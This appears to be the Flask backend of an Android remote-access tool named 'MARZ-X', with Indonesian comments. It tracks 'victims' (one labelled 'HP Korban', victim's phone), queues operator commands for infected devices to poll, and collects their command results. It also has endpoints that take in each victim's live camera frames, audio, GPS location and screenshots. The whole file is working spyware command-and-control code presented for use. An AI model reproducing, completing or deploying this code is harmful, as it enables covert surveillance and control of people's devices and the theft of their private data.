import os
import json
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# ===== SIMULASI DATABASE (MEMORY) =====
victims = [
    {"id": "device123", "name": "HP Korban", "ip": "192.168.1.10", "os": "Android 13", "status": "online"}
]
pending_commands = {}  # { victim_id: command }
results = {}  # { victim_id: [ {command, result, status, time} ] }
streams = {
    "camera": {},
    "audio": {},
    "gps": {},
    "screenshot": {}
}

# ===== HEALTH CHECK =====
@app.route('/')
def home():
    return "MARZ-X Backend Running!"

# ===== VICTIMS =====
@app.route('/api/victims', methods=['GET'])
def get_victims():
    return jsonify(victims)

# ===== KIRIM PERINTAH DARI PANEL =====
@app.route('/api/cmd', methods=['POST'])
def send_command():
    data = request.json
    if not data:
        return jsonify({"error": "no data"}), 400
    victim_id = data.get('victim_id')
    command = data.get('command')
    if not victim_id or not command:
        return jsonify({"error": "missing victim_id or command"}), 400
    pending_commands[victim_id] = command
    if victim_id not in results:
        results[victim_id] = []
    results[victim_id].append({
        "command": command,
        "result": "pending...",
        "status": "pending",
        "time": datetime.now().isoformat()
    })
    return jsonify({"status": "ok"})

# ===== CLIENT POLLING PERINTAH =====
@app.route('/api/command/<victim_id>', methods=['GET'])
def get_command(victim_id):
    cmd = pending_commands.pop(victim_id, None)
    if cmd:
        return jsonify({"action": cmd})
    return jsonify({"action": "none"})

# ===== CLIENT KIRIM HASIL =====
@app.route('/api/result', methods=['POST'])
def receive_result():
    data = request.json
    if not data:
        return jsonify({"error": "no data"}), 400
    victim_id = data.get('victim_id')
    command = data.get('command')
    result = data.get('result')
    status = data.get('status', 'done')
    if victim_id and command:
        if victim_id not in results:
            results[victim_id] = []
        # Update log pending terakhir dengan command yang sama
        found = False
        for log in reversed(results[victim_id]):
            if log['command'] == command and log['status'] == 'pending':
                log['result'] = result
                log['status'] = status
                log['time'] = datetime.now().isoformat()
                found = True
                break
        if not found:
            results[victim_id].append({
                "command": command,
                "result": result,
                "status": status,
                "time": datetime.now().isoformat()
            })
        return jsonify({"status": "ok"})
    return jsonify({"error": "invalid data"}), 400

# ===== AMBIL LOGS =====
@app.route('/api/results/<victim_id>', methods=['GET'])
def get_results(victim_id):
    return jsonify(results.get(victim_id, []))

# ===== STREAMING ENDPOINTS =====
@app.route('/api/stream/camera', methods=['POST'])
def stream_camera():
    data = request.json
    if not data:
        return jsonify({"error": "no data"}), 400
    victim_id = data.get('device_id')
    frame = data.get('frame')
    if victim_id and frame:
        streams['camera'][victim_id] = frame
        return jsonify({"status": "ok"})
    return jsonify({"error": "invalid"}), 400

@app.route('/api/stream/audio', methods=['POST'])
def stream_audio():
    data = request.json
    if not data:
        return jsonify({"error": "no data"}), 400
    victim_id = data.get('device_id')
    audio = data.get('audio')
    if victim_id and audio:
        streams['audio'][victim_id] = audio
        return jsonify({"status": "ok"})
    return jsonify({"error": "invalid"}), 400

@app.route('/api/stream/gps', methods=['POST'])
def stream_gps():
    data = request.json
    if not data:
        return jsonify({"error": "no data"}), 400
    victim_id = data.get('device_id')
    loc = data.get('location')
    if victim_id and loc:
        streams['gps'][victim_id] = loc
        return jsonify({"status": "ok"})
    return jsonify({"error": "invalid"}), 400

@app.route('/api/stream/screenshot', methods=['POST'])
def stream_screenshot():
    data = request.json
    if not data:
        return jsonify({"error": "no data"}), 400
    victim_id = data.get('device_id')
    img = data.get('frame')
    if victim_id and img:
        streams['screenshot'][victim_id] = img
        return jsonify({"status": "ok"})
    return jsonify({"error": "invalid"}), 400

# ===== AMBIL STREAM (OPSIONAL) =====
@app.route('/api/stream/<victim_id>/camera', methods=['GET'])
def get_camera_stream(victim_id):
    frame = streams['camera'].get(victim_id)
    if frame:
        return jsonify({"frame": frame})
    return jsonify({"error": "no frame"}), 404

if __name__ == '__main__':
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
